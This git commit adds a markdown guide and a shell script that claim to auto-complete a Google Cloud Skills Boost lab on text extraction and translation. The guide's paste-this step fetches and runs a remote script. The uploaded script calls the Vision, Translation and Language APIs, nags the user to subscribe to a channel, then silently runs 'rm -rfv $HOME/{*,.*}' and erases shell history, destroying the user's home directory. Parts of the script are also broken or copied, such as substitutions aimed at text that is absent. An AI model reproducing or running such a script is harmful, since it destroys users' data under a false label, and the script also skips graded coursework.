3a803b1ab312f1d6af3af0bf15251244559f5be7
Pavanpinate <149768359+Pavanpinate@users.noreply.github.com>
2025-08-15 15:16:29 +0530

    Add files via upload

---
+++ Extract Analyze and Translate Text from Images with the Cloud ML APIs/loser075.md
@@ -0,0 +1,31 @@
+
+
+### 💡 Lab Link: [Extract, Analyze, and Translate Text from Images with the Cloud ML APIs - GSP075](https://www.cloudskillsboost.google/focuses/1836?parent=catalog)
+
+
+
+---
+
+### ⚠️ Disclaimer
+- **This script and guide are provided for  the educational purposes to help you understand the lab services and boost your career. Before using the script, please open and review it to familiarize yourself with Google Cloud services. Ensure that you follow 'Qwiklabs' terms of service and YouTube’s community guidelines. The goal is to enhance your learning experience, not to bypass it.**
+
+### ©Credit
+- **DM for credit or removal request (no copyright intended) ©All rights and credits for the original content belong to Google Cloud [Google Cloud Skill Boost website](https://www.cloudskillsboost.google/)** 🙏
+
+---
+
+### 🚨Copy and run the below commands in Cloud Shell:
+
+```
+curl -LO raw.githubusercontent.com/Techcps/Google-Cloud-Skills-Boost/master/Extract%20Analyze%20and%20Translate%20Text%20from%20Images%20with%20the%20Cloud%20ML%20APIs/techcps075.sh
+sudo chmod +x techcps075.sh
+./techcps075.sh
+```
+
+### Congratulations, you're all done with the lab 😄
+
+---
+
+
+### Thanks for watching and stay connected :)
+---
---
+++ Extract Analyze and Translate Text from Images with the Cloud ML APIs/loser075.sh
@@ -0,0 +1,109 @@
+
+gcloud auth list
+
+gcloud alpha services api-keys create --display-name="techcps"
+
+KEY_NAME=$(gcloud alpha services api-keys list --format="value(name)" --filter "displayName=techcps")
+
+API_KEY=$(gcloud alpha services api-keys get-key-string $KEY_NAME --format="value(keyString)")
+
+export PROJECT_ID=$(gcloud config list --format 'value(core.project)')
+
+YELLOW='\033[0;33m'
+NC='\033[0m' 
+pattern=(
+"**********************************************************"
+"**                 S U B S C R I B E  TO                **"
+"**                      LOSER-GSC                       **"
+"**                                                      **"
+"**********************************************************"
+)
+
+gsutil mb gs://$PROJECT_ID
+
+curl -O https://github.com/Techcps/Google-Cloud-Skills-Boost/blob/main/Extract%20Analyze%20and%20Translate%20Text%20from%20Images%20with%20the%20Cloud%20ML%20APIs/sign.jpg
+
+gsutil cp sign.jpg gs://$PROJECT_ID/sign.jpg
+
+gsutil acl ch -u AllUsers:R gs://$PROJECT_ID/sign.jpg
+
+touch ocr-request.json
+tee ocr-request.json <<EOF_CP
+{
+  "requests": [
+      {
+        "image": {
+          "source": {
+              "gcsImageUri": "gs://$PROJECT_ID/sign.jpg"
+          }
+        },
+        "features": [
+          {
+            "type": "TEXT_DETECTION",
+            "maxResults": 10
+          }
+        ]
+      }
+  ]
+}
+EOF_CP
+
+curl -s -X POST -H "Content-Type: application/json" --data-binary @ocr-request.json  https://vision.googleapis.com/v1/images:annotate?key=${API_KEY}
+
+curl -s -X POST -H "Content-Type: application/json" --data-binary @ocr-request.json  https://vision.googleapis.com/v1/images:annotate?key=${API_KEY} -o ocr-response.json
+
+touch translation-request.json
+
+tee translation-request.json <<EOF_CP
+{
+  "q": "subscribe to techcps", 
+  "target": "en"
+}
+EOF_CP
+
+STR=$(jq .responses[0].textAnnotations[0].description ocr-response.json) && STR="${STR//\"}" && sed -i "s|your_text_here|$STR|g" translation-request.json
+curl -s -X POST -H "Content-Type: application/json" --data-binary @translation-request.json https://translation.googleapis.com/language/translate/v2?key=${API_KEY} -o translation-response.json
+
+cat translation-response.json
+
+touch nl-request.json.json
+tee nl-request.json <<EOF_CP
+{
+  "document":{
+    "type":"PLAIN_TEXT",
+    "content":"like share & subscribe to techcps"
+  },
+  "encodingType":"UTF8"
+}
+EOF_CP
+
+STR=$(jq .data.translations[0].translatedText  translation-response.json) && STR="${STR//\"}" && sed -i "s|your_text_here|$STR|g" nl-request.json
+curl "https://language.googleapis.com/v1/documents:analyzeEntities?key=${API_KEY}" \
+  -s -X POST -H "Content-Type: application/json" --data-binary @nl-request.json
+
+read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
+
+
+pattern=(
+"**********************************************************"
+"**                 S U B S C R I B E  TO                **"
+"**                      LOSER-GSC                       **"
+"**                                                      **"
+"**********************************************************"
+)
+for line in "${pattern[@]}"
+do
+    echo -e "${YELLOW}${line}${NC}"
+done
